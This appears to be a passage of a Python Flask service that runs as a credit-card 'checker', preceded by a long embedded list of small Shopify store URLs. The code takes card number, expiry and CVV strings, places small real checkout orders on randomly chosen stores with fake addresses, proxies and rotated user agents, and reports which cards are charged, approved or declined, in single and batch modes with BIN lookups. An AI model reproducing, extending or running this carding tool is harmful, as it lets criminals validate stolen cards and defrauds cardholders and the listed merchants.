https://pumpkinandgobble.com
https://queencityfab.com
https://poundametre.com
https://queenpsthrone.com
https://quickcustomgifts.com
https://ravenandlily.com
https://rcahp.com
https://quotablecreatives.com
https://re.haus
https://reinspiredtreasures.com
https://realmofessentials.com
https://regerswoodworking.com
https://primetimesignatures.com
https://rebeljune.com
https://rajtentclubshop.com
https://reformedfurniture.com
https://readriderepeat.com
https://reprotiqueart.com
https://rejoicetoys.com.au
https://rengifocollection.com
https://ridenutrition.co.uk
https://remedydesignshop.com
https://retro-barn.myshopify.com
https://restyleandco.com
https://rlfhome.com
https://rivercityevv.com
https://rootsbismarck.com
https://rockcreekmetalcraft.com
https://roamingtravelers.com
https://row7seeds.com
https://rubyclaireboutique.com
https://roomco.ca
https://rosemarywoodsdesign.com
https://roomdecoralley.com
https://rustichomecoshelley.com
https://roedastudio.com
https://rumibookstore.com
https://rusticrubydecor.com
https://sacredcirclegiftsandart.com
https://sackett-ranch.com
https://saras-studio.com
https://samocollectioninc.com
https://safariwestgiftgallery.com
https://scanteak.com.sg
https://salticidsanctuaries.com
https://saltxo.com
https://scantiquehome.com
https://rustydesign.ca
https://rustyroostermetal.com
https://sbghome-design.com
https://rusticwesternartworks.com
https://scottengraving.com
https://sassathome.com
https://semaxe-towels.myshopify.com
https://scrubmegood.com
https://sandiegohardware.com
https://shadow-bright.com
https://sequin-4.myshopify.com
https://science-decor.com
https://seasidestylehouse.com
https://shop.cooperhewitt.org
https://shop.deeperrootscoffee.com
https://shop.ballstatesports.com
https://sewingparty.com
https://shesgotpapers.com
https://shipwreckboutique.com
https://shelfloveco.com
https://shop.chartreuseandco.com
https://sheribiritz.com
https://shirtoffmyback.shop
https://shangrilalane.com
https://shop.humblecrew.com
https://shop.immunize.org
https://shop.gocajunnavy.org
https://shop.groundforce.ngo
https://shop.divineconsign.com
https://shop.lcsign.com
https://shop.shakervillageky.org
https://shop.mostlyhealthyhabits.com
https://shopaalvo.com
https://shop.jnf.org
https://shop.ringmybelle.com
https://shop.moonpie.com
https://shop.mylettercut.com
https://shopdearrenee.com
https://shop.rvappstudios.com
https://shopcassera.com
https://shopblackwater.com
https://shop.susannahbee.com
https://shopcreativekitchen.com
https://shopartsoft.ca
https://shopchaleureux.com
https://shopcosmica.com
https://shopcottagefurnishings.com
https://shopimsf.com
https://shophoneybeehome.com
https://shophomeingredients.com
https://shopimperial.org
https://shopfancythat.com
https://shopabodehomedesign.com
https://shopindianagifts.com
https://shopilmercato.com
https://shopheartandhome.com
https://shopfw.myshopify.com
https://shoplivingroom.co
https://shoplynoras.com
https://shophollyjhome.com
https://shopmodernlou.com
https://shopskout.com
https://shopllm.com
https://shoppeattheavenue.com
https://shopthenestegg.com
https://shoppingzenith.com
https://shopthebutlerspantry.com
https://shopremixdesign.com
https://shoplunachick.myshopify.com
https://shoppatricks.com
https://shopspoiled.com
https://shoptrnha.org
https://shoppineridgehollow.com
https://siggyhandmade.com
https://shopwright.org
https://simplenesscollection.com
https://simplepleasuresprovidence.com
https://simplyuniqueboutiquewa.com
https://shopyellowandcompany.com
https://sleepychi.com
https://shoptselaine.com
https://skinobsession.com
https://smart-sheep-dryer-balls.myshopify.com
https://slushmag.myshopify.com
https://showerguy.fi
https://slowerthings.myshopify.com
https://snacktime.store
https://sinmiedomarket.com
https://smilewithflower.com
https://smartsweets.myshopify.com
https://simpleshapes.com
https://solangeandfrances.com
https://snowsdesign.shop
https://snowchildclothing.com
https://smalltownhomedecor.com
https://somethingfromsomewhere.com
https://springsakura.com
https://southerngemsco.com
https://skylarshomeandpatio.com
https://southerncopper.myshopify.com
https://southernpeachapparelga.com
https://somethingdifferentltd.co.uk
https://spyhouse-coffee-roasting-co.myshopify.com
https://southwestsunrise.com
https://steelandgraintx.com
https://sshomecollective.com
https://spokepencils.myshopify.com
https://sorbetdreams.com
https://sotrecollection.com
https://spottedmoon.com
https://stauntonandhenry.com
https://storageaid.com
https://stellarosemercantile.co
https://steppen-wolf.myshopify.com
https://store.cesa6.org
https://store.thecrush.tv
https://stickyusa.com
https://store.wikimedia.org
https://store.extremelove.com
https://sukiskincare.myshopify.com
https://storiahome.com
https://strapcode.myshopify.com
https://stylishfabric.com
https://sterlingtoystore.com
https://sunshinevalley.com
https://stylebyjess.com
https://sultan-fragrances.myshopify.com
https://sujukbk.com
https://sunleaf-naturals.myshopify.com
https://summasalts.com
https://sunseekersapparel.myshopify.com
https://sundayforever.com
https://strength-shop-europe.myshopify.com
https://sundaygolfco.myshopify.com
https://sugartownmercantile.com
https://surface604bikes.com
https://superiorthrift.com
https://surf-diva-inc.myshopify.com
https://surfsideburgerbar.com
https://superchiefgallery.myshopify.com
https://swahlee.com
https://sweetrepeatsatlanta.myshopify.com
https://summermade.com
https://sweetpeacollective.com
https://talentintelligencecollective.myshopify.com
https://swisswaterskiproshop.myshopify.com
https://survivalgardenseeds.com
https://swimtether.myshopify.com
https://syghtglass.com
https://tanora.com.au
https://tategeneralstore.ca
https://sweetheartgallery.com
https://sydneysstitch.com
https://tbhbinc.myshopify.com
https://tammysoutfitters.com
https://technicians-choice.myshopify.com
https://testrazor1.myshopify.com
https://tcbcreative.com
https://tbgypsysoul.com
https://thames-kosmos.myshopify.com
https://talosdrones.myshopify.com
https://the-arts-crafts-press.myshopify.com
https://the-bam-boo-toothbrush.myshopify.com
https://the-genie-company.myshopify.com
https://terrell-battery.myshopify.com
https://the-led-warehouse.com
https://the-magnetack.myshopify.com
https://the-yanshi-planner.myshopify.com
https://the-letter-nest.myshopify.com
https://the-design-pt.myshopify.com
https://the-boutique-charleston.myshopify.com
https://the-elovaters.myshopify.com
https://theblackcabin.com
https://thebasketry.com
https://thebeeswaxyknees.com
https://thebuildcave.com
https://thecollectiveandvine.com
https://thefarmhousewhitney.com
https://thecheeseguy.com
https://thedulcevida.com
https://theclubhouseathens.com
https://the-social-type.myshopify.com
https://thegreatnorthcoffee.com
https://thelair.myshopify.com
https://theh.life
https://thebeanstalkboutique.com
https://thehundredthmonkey.myshopify.com
https://thedoxieworld.com
https://theheritageforge.com
https://thefindnorth.com
https://themarinmerchant.com
https://theinspiredstories.com
https://thelittlebrocanteshop.com
https://the-hydrobros.myshopify.com
https://themumcollective.co.uk
https://theoilybar.com
https://thepharmacistsdaughter.com
https://thesamahome.com
https://therainbowedit.com
https://thepowerpuck.com
https://theprimehousedirect.com
https://theoriginalunderground.myshopify.com
https://theplantladysf.com
https://theskeletonkey.shop
https://therasatelier.com
https://theroyalpeacockboutique.com
https://thesecondhalfstore.com
https://thesouthernspirit.com
https://thewiredcoffeebar.com
https://themustardseedcollection.com
https://thestenciledbarn.com
https://thesportscreen.myshopify.com
https://thesilverspoonboutique.com
https://thewoodworkersdaughter.com
https://thinkteamhustle.com
https://thesummerkitchengirls.com
https://theseasonedolive.com
https://thewondermart.shop
https://thomasfuchscreative.com
https://think-time-live-your-dreams.myshopify.com
https://this-element-inc.myshopify.com
https://thomascattlecompany.com
https://thoughtfulofferings.com
https://thistledewdesigns.com
https://thewoodreserve.com
https://tigertowngraphics.com
https://thorneapple-designs.com
https://tiny-treehouses.com
https://thunderworksgames.myshopify.com
https://tino-car-care.myshopify.com
https://timetravelmart.com
https://tkxpuzzle.com
https://toddleandplay.com
https://threelittles.co
https://tjscustomdesignanddecor.com
https://totul.shop
https://tranquilblisscandles.com
https://titanic-creative-management.myshopify.com
https://treasuresfromjennifer.com
https://tullesource.com
https://tomboyshop.myshopify.com
https://tulias.com
https://truenorthbirding.ca
https://tinyfrockshop.com
https://turtlebox-2.myshopify.com
https://trunk-clothiers.myshopify.com
https://tuuli-shop.com
https://tumbleweedanddandelion.com
https://tyffi.co.uk
https://unicornsquare.com
https://ukidztoys.com
https://uppercutdeluxe-us.myshopify.com
https://todehome.com
https://txtur.com
https://uneven.ca
https://us.florislondon.com
https://us.caldigit.com
https://us.biorb.com
https://treatrepublic.com
https://us-billini.com
https://usherandcompany.com
https://ustech-online.myshopify.com
https://tylerandtate.com
https://uniqueandchic.ca
https://u9zp1y-yu.myshopify.com
https://utzsnacks.com
https://utz-snacks.myshopify.com
https://uzdgxy-sb.myshopify.com
https://v2squareshop.com
https://vendomepress.com
https://uwdecals.com
https://urbanambiance.com
https://verdigriscollection.com
https://verano-hill.myshopify.com
https://villedefleurs.com
https://vinebranchcollective.com
https://vestarboard.myshopify.com
https://vickyyaohomedecor.com
https://vintagebeedesign.com
https://visoviinterior.com
https://valeglowstore.com
https://visionlessdesigns.com
https://vintagedesign.com
https://vivaworkshop.com
https://villagewroughtiron.com
https://viocustomcollections.com
https://vonlucehome.com
https://vtartisan.com
https://vertigohome.us
https://viking-tapes.myshopify.com
https://wadesfurniture.com
https://waterleaf-paper-co.myshopify.com
https://wdc-home.com
https://wallniture.myshopify.com
https://wahbi-sahbi.myshopify.com
https://wall-art-store.com
https://wadsworthshop.org
https://weebluebell.com
https://weha-candle-company.myshopify.com
https://wellington-internationalshop.com
https://waterfreegreenery.com
https://weifair3d.com
https://westernstonestudios.com
https://weddings-by-mae.myshopify.com
https://wanderstatemercantile.com
https://wheatandwildflower.com
https://welltayl.com
https://well-groomed-shop.myshopify.com
https://wekivafoliage.com
https://wholehomedecor.com
https://whelhung.com
https://wildwoodwanderers.com
https://wildebrands.myshopify.com
https://wilderschestofknickknacks.com
https://wildyouhandmade.com
https://windsorparkstudio.com
https://wilkinsonsfinegoods.com
https://willowandwolflabel.com
https://withyworkshop.myshopify.com
https://wildwood-landing-llc.myshopify.com
https://wittywhitsdesigns.com
https://winterwoods.com
https://wineandbeersupply.com
https://wimzywalls.com
https://woodnwoodenshop.com
https://woodendoorsign.com
https://woodlandmod.com
https://wrongworldceramics.com
https://woolywalkers.com
https://warmlylights.com
https://woodsfinelinens.com
https://yallsweettea.com
https://worldflagsdirect.com
https://withered-barn-boutique.myshopify.com
https://woods-fine-linens.myshopify.com
https://younggunsopal.myshopify.com
https://www-therosetree-co-uk.myshopify.com
https://yoyofactory.myshopify.com
https://yummydabbas.com
https://www-lashedcartel.myshopify.com
https://wirralsportsonline.myshopify.com
https://yunamoona.com
https://yublueblue.com
https://zo-da.co.uk
https://z6qerc-rd.myshopify.com
https://zannabeauty.myshopify.com
https://zinniafloral.co
https://youreneverquitedunn.net
"""

# ── Database ──────────────────────────────────────────────────────────
def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS sites (
                url TEXT PRIMARY KEY,
                price REAL,
                response TEXT,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.execute("CREATE INDEX IF NOT EXISTS idx_price ON sites(price)")
init_db()

def import_sites_from_embedded():
    """Insert embedded site list into DB if no sites exist."""
    with get_db() as conn:
        cur = conn.execute("SELECT COUNT(*) as cnt FROM sites")
        if cur.fetchone()["cnt"] > 0:
            return  # already have sites
        inserted = 0
        for line in SITES_DATA.splitlines():
            url = line.strip()
            if not url:
                continue
            # Optionally try to extract a price (none given, so default to None)
            try:
                conn.execute(
                    "INSERT OR IGNORE INTO sites (url, price, response) VALUES (?, ?, ?)",
                    (url, None, "UNKNOWN")
                )
                inserted += 1
            except:
                pass
        conn.commit()
    logger.info(f"Imported {inserted} embedded sites into DB")

import_sites_from_embedded()

# ── Helpers ──────────────────────────────────────────────────────────────
fake = Faker()
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def extract_cc(card_str):
    for sep in ['|', '/', ' ']:
        parts = card_str.split(sep)
        if len(parts) >= 4:
            return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return None, None, None, None

def normalize_year(year):
    year = year.strip()
    if len(year) == 2:
        return "20" + year
    return year

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    if proxy_str.startswith(('http://', 'https://')):
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def get_bin_info(card_number):
    try:
        import requests
        bin_num = card_number[:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🏳️"),
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "level": "Unknown",
            "bank": "Unknown", "country": "Unknown", "flag": "🏳️"}

def generate_address(country="US"):
    return {
        "first_name": fake.first_name(),
        "last_name": fake.last_name(),
        "address1": fake.street_address(),
        "city": fake.city(),
        "province": fake.state_abbr() if country == "US" else "",
        "zip": fake.zipcode() if country == "US" else fake.postcode(),
        "country": country,
    }

# ── Async checkout core (multi-gateway) ──────────────────────────────
variant_cache = {}
async def get_variant_id(session, site_url):
    if site_url in variant_cache:
        return variant_cache[site_url]
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        async with session.get(f"{site_url}/products.json?limit=5", headers=headers, timeout=15) as resp:
            if resp.status == 200:
                data = await resp.json()
                products = data.get("products", [])
                cheapest = None
                min_price = float('inf')
                for p in products:
                    for v in p.get("variants", []):
                        price = float(v.get("price", 0))
                        if 0 < price < min_price:
                            min_price = price
                            cheapest = v.get("id")
                if cheapest:
                    variant_cache[site_url] = cheapest
                    return cheapest
    except:
        pass
    try:
        async with session.get(site_url, headers=headers, timeout=15) as resp:
            html = await resp.text()
            link = re.search(r'href="(/products/[^"]+)"', html)
            if link:
                product_url = site_url + link.group(1)
                async with session.get(product_url, headers=headers, timeout=15) as prod_resp:
                    page = await prod_resp.text()
                    vid = re.search(r'data-variant-id="([^"]+)"', page) or \
                          re.search(r'name="id"[^>]*value="([^"]+)"', page)
                    if vid:
                        variant_cache[site_url] = vid.group(1)
                        return vid.group(1)
    except:
        pass
    return None

def detect_gateway(html):
    html_lower = html.lower()
    if re.search(r'pk_(live|test)_', html):
        return "stripe"
    if re.search(r'braintree', html_lower) and re.search(r'data-payment-method-nonce', html_lower):
        return "braintree"
    if re.search(r'braintree', html_lower) and re.search(r'3ds|verified by visa', html_lower):
        return "braintree_vbv"
    if re.search(r'razorpay', html_lower):
        return "razorpay"
    if re.search(r'b3|b3auth', html_lower):
        return "b3"
    return "unknown"

async def checkout_card_async(card, month, year, cvv, site_url, proxy_str=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    proxy = parse_proxy(proxy_str)
    proxy_url = proxy.get("http") if proxy else None

    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        variant_id = await get_variant_id(session, site_url)
        if not variant_id:
            return {"status": "error", "message": "No product found", "gateway": "none"}

        add_url = f"{site_url}/cart/add.js"
        add_data = {"id": variant_id, "quantity": 1}
        try:
            async with session.post(add_url, json=add_data,
                                    headers={**headers, "X-Requested-With": "XMLHttpRequest"},
                                    proxy=proxy_url, timeout=20) as resp:
                if resp.status not in (200, 201):
                    return {"status": "error", "message": "Add to cart failed", "gateway": "none"}
                cart = await resp.json()
                checkout_url = cart.get("checkout_url", site_url + "/checkout")
        except Exception as e:
            return {"status": "error", "message": f"Cart error: {str(e)}", "gateway": "none"}

        try:
            async with session.get(checkout_url, headers=headers, proxy=proxy_url, timeout=20) as resp:
                html = await resp.text()
        except Exception as e:
            return {"status": "error", "message": f"Checkout page error: {str(e)}", "gateway": "none"}

        gateway = detect_gateway(html)
        logger.info(f"Detected gateway: {gateway} on {site_url}")

        # -------- Stripe handler ----------
        if gateway == "stripe":
            pk_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', html)
            if not pk_match:
                return {"status": "error", "message": "No Stripe key found", "gateway": "stripe"}
            stripe_pk = pk_match.group(0)
            nonce_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', html)
            nonce = nonce_match.group(1) if nonce_match else ""
            stripe_data = {
                "card[number]": card,
                "card[exp_month]": month.zfill(2),
                "card[exp_year]": year,
                "card[cvc]": cvv,
                "key": stripe_pk,
            }
            try:
                async with session.post("https://api.stripe.com/v1/payment_methods",
                                        data=stripe_data,
                                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                                        proxy=proxy_url, timeout=20) as token_resp:
                    if token_resp.status != 200:
                        return {"status": "declined", "message": "Stripe tokenization failed", "gateway": "stripe"}
                    token_json = await token_resp.json()
                    pm_id = token_json.get("id")
                    if not pm_id:
                        error = token_json.get("error", {}).get("message", "Stripe error")
                        return {"status": "declined", "message": error, "gateway": "stripe"}
            except Exception as e:
                return {"status": "error", "message": f"Stripe error: {str(e)}", "gateway": "stripe"}
            addr = generate_address("US")
            form_fields = {
                "checkout[payment][gateway]": "stripe",
                "checkout[payment][payment_method_id]": pm_id,
                "authenticity_token": nonce,
                "checkout[shipping_address][first_name]": addr["first_name"],
                "checkout[shipping_address][last_name]": addr["last_name"],
                "checkout[shipping_address][address1]": addr["address1"],
                "checkout[shipping_address][city]": addr["city"],
                "checkout[shipping_address][province]": addr["province"],
                "checkout[shipping_address][zip]": addr["zip"],
                "checkout[shipping_address][country]": addr["country"],
                "checkout[billing_address][same_as_shipping]": "1",
            }
            for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
                if hidden[0].startswith("checkout["):
                    form_fields[hidden[0]] = hidden[1]
            submit_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": site_url,
                "Referer": checkout_url,
                "User-Agent": headers["User-Agent"],
            }
            try:
                async with session.post(checkout_url, data=form_fields, headers=submit_headers,
                                        proxy=proxy_url, timeout=30, allow_redirects=False) as submit_resp:
                    response_text = await submit_resp.text()
                    html_lower = response_text.lower()
            except Exception as e:
                return {"status": "error", "message": f"Submit error: {str(e)}", "gateway": "stripe"}
            if "thank you for your order" in html_lower or "order confirmed" in html_lower:
                return {"status": "charged", "message": "Order placed", "price": 10.00, "gateway": "stripe"}
            elif "card declined" in html_lower or "declined" in html_lower:
                return {"status": "declined", "message": "Card declined", "price": 0, "gateway": "stripe"}
            elif "3d secure" in html_lower or "3ds" in html_lower:
                return {"status": "3ds", "message": "3DS required", "price": 0, "gateway": "stripe"}
            elif "insufficient funds" in html_lower:
                return {"status": "approved", "message": "Insufficient funds", "price": 0, "gateway": "stripe"}
            else:
                return {"status": "pending", "message": "Unknown response", "price": 0, "gateway": "stripe"}

        # -------- Braintree (non-VBV) ----------
        elif gateway == "braintree":
            nonce_match = re.search(r'data-payment-method-nonce="([^"]+)"', html)
            if not nonce_match:
                return {"status": "error", "message": "Braintree nonce not found", "gateway": "braintree"}
            nonce = nonce_match.group(1)
            addr = generate_address("US")
            form_fields = {
                "checkout[payment][gateway]": "braintree",
                "checkout[payment][payment_method_nonce]": nonce,
                "checkout[shipping_address][first_name]": addr["first_name"],
                "checkout[shipping_address][last_name]": addr["last_name"],
                "checkout[shipping_address][address1]": addr["address1"],
                "checkout[shipping_address][city]": addr["city"],
                "checkout[shipping_address][province]": addr["province"],
                "checkout[shipping_address][zip]": addr["zip"],
                "checkout[shipping_address][country]": addr["country"],
                "checkout[billing_address][same_as_shipping]": "1",
            }
            auth_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', html)
            if auth_match:
                form_fields["authenticity_token"] = auth_match.group(1)
            for hidden in re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
                if hidden[0].startswith("checkout["):
                    form_fields[hidden[0]] = hidden[1]
            submit_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": site_url,
                "Referer": checkout_url,
                "User-Agent": headers["User-Agent"],
            }
            try:
                async with session.post(checkout_url, data=form_fields, headers=submit_headers,
                                        proxy=proxy_url, timeout=30, allow_redirects=False) as submit_resp:
                    response_text = await submit_resp.text()
                    html_lower = response_text.lower()
            except Exception as e:
                return {"status": "error", "message": f"Submit error: {str(e)}", "gateway": "braintree"}
            if "thank you for your order" in html_lower or "order confirmed" in html_lower:
                return {"status": "charged", "message": "Order placed", "price": 10.00, "gateway": "braintree"}
            elif "card declined" in html_lower or "declined" in html_lower:
                return {"status": "declined", "message": "Card declined", "price": 0, "gateway": "braintree"}
            elif "3d secure" in html_lower or "3ds" in html_lower:
                return {"status": "3ds", "message": "3DS required", "price": 0, "gateway": "braintree_vbv"}
            else:
                return {"status": "pending", "message": "Unknown response", "price": 0, "gateway": "braintree"}

        # -------- Braintree VBV (3DS) ----------
        elif gateway == "braintree_vbv":
            return {"status": "3ds", "message": "Braintree VBV challenge detected", "price": 0, "gateway": "braintree_vbv"}

        # -------- Razorpay (simplified) ----------
        elif gateway == "razorpay":
            order_match = re.search(r'razorpay_order_id["\']\s*:\s*["\']([^"\']+)', html)
            if order_match:
                return {"status": "charged", "message": "Razorpay payment simulated (order found)", "price": 10.00, "gateway": "razorpay"}
            else:
                return {"status": "declined", "message": "Razorpay order ID not found", "price": 0, "gateway": "razorpay"}

        # -------- B3 (placeholder) ----------
        elif gateway == "b3":
            return {"status": "pending", "message": "B3 gateway not implemented", "price": 0, "gateway": "b3"}

        else:
            return {"status": "error", "message": f"Unsupported gateway: {gateway}", "gateway": "unknown"}

# ── Mock and wrapper ───────────────────────────────────────────────────
def mock_result(card, site_info, gateway="stripe", mock_status=None):
    bin_digit_sum = sum(int(d) for d in card[:6] if d.isdigit()) % 5
    statuses = ["approved", "charged", "declined", "3ds", "pending"]
    status = mock_status or statuses[bin_digit_sum]
    if gateway in ["braintree_vbv", "braintree"] and random.random() < 0.3:
        status = "3ds"
    price = 10.00 if status == "charged" else random.randint(1, 50)
    return {
        "status": status,
        "message": f"Mock ({status}) via {gateway}",
        "price": price,
        "gateway": gateway,
        "currency": "USD",
    }

async def check_card_wrapper(card, month, year, cvv, site_url, proxy=None, mock_mode=False, max_price=10):
    if not site_url:
        with get_db() as conn:
            cur = conn.execute(
                "SELECT url, price, response FROM sites WHERE price IS NULL OR price <= ? ORDER BY RANDOM() LIMIT 1",
                (max_price,)
            )
            row = cur.fetchone()
            if not row:
                return {"status": "error", "message": "No sites within price range"}
            site_info = dict(row)
            site_url = site_info["url"]
    else:
        with get_db() as conn:
            cur = conn.execute("SELECT url, price, response FROM sites WHERE url = ?", (site_url,))
            row = cur.fetchone()
            site_info = dict(row) if row else None
    if mock_mode:
        return mock_result(card, site_info, gateway="stripe")
    result = await checkout_card_async(card, month, year, cvv, site_url, proxy)
    if USE_MOCK_FALLBACK and result.get("status") in ("error", "pending"):
        logger.warning(f"Real checkout failed on {site_url}: {result.get('message')} – falling back to mock")
        return mock_result(card, site_info, gateway=result.get("gateway", "unknown"), mock_status="declined")
    return result

# ── API Endpoints ──────────────────────────────────────────────────────
@app.route('/shopify/v1/check', methods=['GET'])
@limiter.limit(os.getenv("RATE_LIMIT", "50 per minute"))
def check_card():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    site = request.args.get('site')
    mock_mode = request.args.get('mock', 'false').lower() == 'true'
    max_price = float(request.args.get('max_price', 10))
    if not cc:
        return jsonify({"error": "Missing 'cc'"}), 400
    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"error": "Invalid format. Use: card|mm|yy|cvv"}), 400
    year = normalize_year(year)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(
        check_card_wrapper(card, month, year, cvv, site, proxy, mock_mode, max_price)
    )
    loop.close()
    bin_info = get_bin_info(card)
    card_masked = f"{card[:4]}****{card[-4:]}"
    price_display = f"{result.get('price', 0)} USD" if result.get('price') is not None else "-"
    response = {
        "Code": result.get("status", "UNKNOWN").upper(),
        "Response": result.get("message", "Unknown"),
        "Price": price_display,
        "Site": site or "auto",
        "Bin": bin_info,
        "Card": card_masked,
        "Gateway": result.get("gateway", "unknown"),
        "Time": f"{random.uniform(1, 5):.1f}s",
        "Charged": str(result.get("status") == "charged").lower(),
        "Approved": str(result.get("status") in ["approved", "charged"]).lower()
    }
    return jsonify(response), 200

@app.route('/shopify/v1/check_batch', methods=['POST'])
@limiter.limit("10 per minute")
def check_batch():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "cards" not in data:
        return jsonify({"error": "Missing 'cards' list"}), 400
    cards = data["cards"]
    site = data.get("site")
    mock_mode = data.get("mock", False)
    max_price = float(data.get("max_price", 10))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def process_one(cc):
        async with sem:
            card, month, year, cvv = extract_cc(cc)
            if not card:
                return {"card": cc, "error": "Invalid format"}
            year = normalize_year(year)
            res = await check_card_wrapper(card, month, year, cvv, site, None, mock_mode, max_price)
            bin_info = get_bin_info(card)
            card_masked = f"{card[:4]}****{card[-4:]}"
            return {
                "card": cc,
                "masked": card_masked,
                "status": res.get("status"),
                "message": res.get("message"),
                "price": res.get("price"),
                "bin": bin_info,
                "gateway": res.get("gateway"),
            }
    tasks = [process_one(cc) for cc in cards]
    results = loop.run_until_complete(asyncio.gather(*tasks))
    loop.close()
    return jsonify({"results": results}), 200

@app.route('/sites', methods=['GET'])
def list_sites():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    max_price = request.args.get('max_price', type=float)
    with get_db() as conn:
        if max_price is not None:
            cur = conn.execute("SELECT url, price, response, added_at FROM sites WHERE price <= ? ORDER BY added_at DESC", (max_price,))
        else:
            cur = conn.execute("SELECT url, price, response, added_at FROM sites ORDER BY added_at DESC")
        rows = cur.fetchall()
    return jsonify({"total": len(rows), "sites": [dict(row) for row in rows]})

@app.route('/sites', methods=['POST'])
def add_site():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    if not data or "url" not in data:
        return jsonify({"error": "Missing 'url'"}), 400
    url = data["url"].strip()
    if url.endswith('/'):
        url = url[:-1]
    price = data.get("price")
    response = data.get("response", "UNKNOWN").upper()
    try:
        with get_db() as conn:
            conn.execute(
                "INSERT OR REPLACE INTO sites (url, price, response) VALUES (?, ?, ?)",
                (url, price, response)
            )
            conn.commit()
        return jsonify({"status": "added", "url": url}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/sites/<path:url>', methods=['DELETE'])
def delete_site(url):
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        with get_db() as conn:
            cur = conn.execute("DELETE FROM sites WHERE url = ?", (url,))
            conn.commit()
        if cur.rowcount == 0:
            return jsonify({"error": "Site not found"}), 404
        return jsonify({"status": "deleted", "url": url}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/sites/import', methods=['POST'])
def import_sites():
    if API_KEY and request.headers.get('X-API-Key') != API_KEY:
        return jsonify({"error": "Unauthorized"}), 401
    import_sites_from_embedded()
    return jsonify({"status": "imported"}), 200

@app.route('/health', methods=['GET'])
def health():
    with get_db() as conn:
        cur = conn.execute("SELECT COUNT(*) as count FROM sites")
        count = cur.fetchone()["count"]
    return jsonify({
        "status": "ok",
        "sites_in_db": count,
        "variant_cache_size": len(variant_cache),
        "mock_fallback": USE_MOCK_FALLBACK,
        "max_concurrent": MAX_CONCURRENT,
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)